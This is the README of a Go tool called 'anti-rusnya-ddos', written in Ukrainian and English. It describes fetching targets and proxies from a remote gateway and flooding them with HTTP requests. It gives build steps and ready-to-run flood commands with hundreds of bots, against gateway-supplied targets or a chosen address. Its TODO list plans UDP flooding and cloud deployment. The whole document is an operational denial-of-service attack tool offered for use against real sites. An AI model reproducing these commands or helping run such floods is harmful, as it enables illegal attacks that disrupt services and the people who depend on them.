# anti-rusnya-ddos

Як запустити на клауді (GCP):
https://docs.google.com/document/d/1ZREB8bejySMtdSWfHS8rDNiywsytLZhV05WyUsVhNMI/edit

### HOW ```antirus ddatack``` WORKS
1) You contact the `GATEWAY` (e.g. http://rockstarbloggers.ru/hosts.json), to get a list of `SOURCE`s .
2) Contact a `SOURCE` to get the target and proxy for attack (examples of responses are in `example/` directory).
3) Start sending requsts to the target endpoint to show your love :blue_heart: :yellow_heart: 

_TODO: Checks & verifications should be in place at every step_ 

## ЗБІЛДИТИ ПРОГРАМУ (TO BUILD)
```bash
git clone https://github.com/meddion/anti-rusnya-ddos.git
cd anti-rusnya-ddos

# Docker
docker build -t antirus . 
docker run -it --rm antirus help 

# Або локально (Or locally)
make build # or go build -o antirus -v .
./antirus help
```
## ДОСТУПНІ КОМАНДИ (COMMANDS)
```bash
# Щоб глянути доступні команди
docker run -it --rm antirus help 
# or
./antirus help
```
```bash
# як використовувати
./antirus help ddatack 

# HTTP flood атака від: (https://t.me/incourse911)
./antirus ddatack --bots 500 --gateway "http://rockstarbloggers.ru/hosts.json"
```
```bash

# HTTP flood атака однієї цілі
./antirus help target

./antirus target --bots 600 <TARGET_ADDRESS>

```

## TODO:
- TEST, TEST, AND TEST!
- Adjust connection constants

- Push docker image to docker hub

- Make a general DDoS tool (UDP), not only HTTP flood

- Add own sources & proxies -- create gateway and target api's

- Add script to launch in GCP
